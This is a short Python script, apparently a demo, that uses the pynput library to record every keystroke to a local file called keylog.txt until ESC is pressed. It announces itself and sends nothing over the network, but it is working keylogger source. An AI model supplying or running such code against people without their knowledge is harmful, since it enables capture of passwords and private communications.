from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        # Write normal keys to the file
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    print("Starting keylogger. Press ESC to stop and save log.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print(f"Keystrokes saved to {log_file}")

if __name__ == "__main__":
    main()
